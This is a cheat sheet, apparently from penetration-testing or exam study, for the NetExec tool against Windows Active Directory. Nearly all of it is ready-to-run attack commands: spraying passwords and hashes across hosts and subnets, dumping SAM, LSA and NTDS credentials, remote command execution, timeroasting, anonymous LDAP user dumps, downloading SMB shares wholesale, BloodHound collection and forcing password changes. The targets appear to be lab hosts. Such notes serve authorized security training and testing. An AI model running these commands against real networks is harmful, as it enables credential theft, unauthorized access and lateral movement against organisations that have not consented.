https://www.netexec.wiki

Note: Pwn3d! means code exec and RDP possible.

Spraying
	if you have a user list, always try spraying the list on both users and passwords

#### Proper Install
```bash
sudo apt purge netexec
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

#### Quick Wins
```bash
# Extract password hashes by abusing NTP similar to kerberoasting
-M timeroast
```
## General Usage
```bash
#Collect creds as you enumerate a network and reuse them

# Spray domain users
nxc smb 172.16.182.13 -u users -H hashes --continue-on-success
nxc smb 172.16.182.13 -u users -p passwords --continue-on-success

# Spray for local users
nxc smb <ip> -U users -P passwords --continue-on-success --local-auth
nxc smb <ip> -U users -H hashes --continue-on-success --local-auth

# Spray subnet for user !!!
nxc smb 10.10.10.0/24 -u bob -p password123

# List Share
netexec smb 172.16.191.11 -u joe -d medtech.com -p "Flowers1" --shares

# List User info
--users # not always everyone...

# List pass-pol
--pass-pol # Useful for pass resets (See troubleshooting)

# Dump Creds
--sam
--las
--ntds

# Command execution
-x <command>

# Dump all readable files from smb share
nxc smb <stuff> -M spider_plus -o DOWNLOAD_FLAG=True
```

Enumerate users with `nxc ldap` -- if `ldapsearch` returns anything successful, do this!!!
```bash
# Users (if anon ldapsearch returns stuff, use blank user and pass fields...)
nxc ldap <ip> -u '' -p '' --users  # --users might miss some if they have no data

# FULL DUMP 
nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=*)" "" # parse very carefully
| grep -i 'member' # might reveal additional users but do NOT rely on only this...

# Description fields
nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password>' -M get-desc-users
```

## Collect Bloodhound data
```bash
nxc ldap '<dc_hostname.domain>(or IP address)' -d '<domain_name>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip_address (usually of DC)>

# proxychains
proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2 --dns-tcp
```

## Troubleshooting

STATUS_PASSWORD_MUST_CHANGE
```bash
# STATUS_PASSWORD_MUST_CHANGE means we must change the password before use
nxc smb <ip> -u <target> -p <pass> -M change-password -o NEWPASS='h@cK3d!!!!!!'
```